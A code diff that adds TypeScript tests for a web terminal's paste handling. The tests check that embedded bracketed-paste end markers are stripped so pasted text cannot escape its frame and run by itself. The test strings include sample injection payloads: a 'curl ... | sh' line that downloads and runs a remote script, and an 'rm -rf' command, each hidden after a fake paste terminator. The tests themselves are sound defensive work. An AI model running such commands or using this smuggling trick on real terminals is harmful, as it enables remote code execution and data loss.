@@ -4,10 +4,17 @@
  * the user's Ctrl+C interrupt or silently drops their copy, so it is pinned.
  */
 
+import type { Terminal } from '@xterm/xterm';
 import { describe, expect, it } from 'vitest';
 
 import { TERMINAL_OSC52_MAX_BASE64_CHARS } from '../src/constants.js';
-import { clipboardKeyAction, decodeOsc52, type KeyChord } from '../src/terminal/clipboardKeys.js';
+import { attachClipboardInput, pasteText } from '../src/terminal/clipboardInput.js';
+import {
+  clipboardKeyAction,
+  decodeOsc52,
+  type KeyChord,
+  stripPasteMarkers,
+} from '../src/terminal/clipboardKeys.js';
 
 const chord = (key: string, mods: Partial<KeyChord> = {}): KeyChord => ({
   key,
@@ -96,5 +103,44 @@ describe('decodeOsc52', () => {
     expect(decodeOsc52('c;not base64!')).toBeNull();
     expect(decodeOsc52(`c;${btoa('\xff\xfe')}`)).toBeNull(); // not UTF-8
     expect(decodeOsc52(`c;${'A'.repeat(TERMINAL_OSC52_MAX_BASE64_CHARS + 4)}`)).toBeNull();
+  });
+});
+
+describe('S5.2: a paste cannot end its own bracketed-paste frame', () => {
+  it('drops ESC[200~ / ESC[201~ (also rebuilt from pieces) and keeps the rest, newlines too', () => {
+    expect(stripPasteMarkers('ls\x1b[201~\rcurl https://x/p|sh\r')).toBe('ls\rcurl https://x/p|sh\r');
+    expect(stripPasteMarkers('a\x1b[20\x1b[201~1~b\x1b[200~')).toBe('ab');
+    expect(stripPasteMarkers('plain\ntext \x1b[31mred')).toBe('plain\ntext \x1b[31mred');
+  });
+
+  // ponytail: TerminalPane's `paste` handle (key bar, phone paste, paste buttons) calling
+  // pasteText is checked by reading, not here; a component or e2e check if it ever regresses.
+  it("the browser's paste listener (Ctrl+V) and pasteText strip the markers", () => {
+    const pasted: string[] = [];
+    let onPaste: ((ev: unknown) => void) | undefined;
+    const host = {
+      addEventListener: (type: string, fn: (ev: unknown) => void, capture: boolean) => {
+        if (type === 'paste' && capture) onPaste = fn;
+      },
+      removeEventListener: () => undefined,
+    };
+    const term = {
+      paste: (d: string) => pasted.push(d),
+      attachCustomKeyEventHandler: () => undefined,
+      parser: { registerOscHandler: () => ({ dispose: () => undefined }) },
+    };
+    attachClipboardInput(term as unknown as Terminal, {
+      isActive: () => true,
+      host: host as unknown as HTMLElement,
+    });
+    let stopped = 0;
+    onPaste?.({
+      clipboardData: { getData: (k: string) => (k === 'text/plain' ? 'ls\x1b[201~\rrm -rf x\r' : '') },
+      preventDefault: () => stopped++,
+      stopImmediatePropagation: () => stopped++,
+    });
+    pasteText(term as unknown as Terminal, 'y\x1b[201~\r');
+    expect(pasted).toEqual(['ls\rrm -rf x\r', 'y\r']);
+    expect(stopped).toBe(2);
   });
 });
